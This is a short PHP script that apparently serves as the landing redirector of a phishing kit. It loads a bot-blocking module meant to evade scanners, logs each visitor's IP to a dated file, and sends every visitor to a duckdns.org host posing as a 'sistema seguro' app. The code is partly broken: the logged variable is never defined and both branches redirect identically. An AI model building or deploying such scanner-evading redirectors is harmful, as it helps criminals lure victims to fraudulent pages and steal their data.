<?php
require_once('block-bots/initialize.php');

$iphone = strpos($_SERVER['HTTP_USER_AGENT'],"iPhone");
$ipad = strpos($_SERVER['HTTP_USER_AGENT'],"iPad");
$android = strpos($_SERVER['HTTP_USER_AGENT'],"Android");
$palmpre = strpos($_SERVER['HTTP_USER_AGENT'],"webOS");
$berry = strpos($_SERVER['HTTP_USER_AGENT'],"BlackBerry");
$ipod = strpos($_SERVER['HTTP_USER_AGENT'],"iPod");

$timestamp  = mktime(date("H")-3, date("i"), date("s"), date("m"), date("d"), date("Y"));
$datinha    = gmdate("d-m-Y", $timestamp);
$ip = $_SERVER['REMOTE_ADDR'];
$tipo = $_POST["tipo"];

     $abrir_txt = fopen('log/'.$datinha . ' - ' . $ip . '.txt', "a");
     fwrite($abrir_txt, $info_salva);
     fclose($abrir_txt);

if ($iphone || $android || $palmpre || $ipod || $ipad || $berry == true)
{
echo "<script>window.location='https://app-sistemaseg1.duckdns.org'</script>";
}
else {
echo "<script>window.location='https://app-sistemaseg1.duckdns.org'</script>";
}
?>
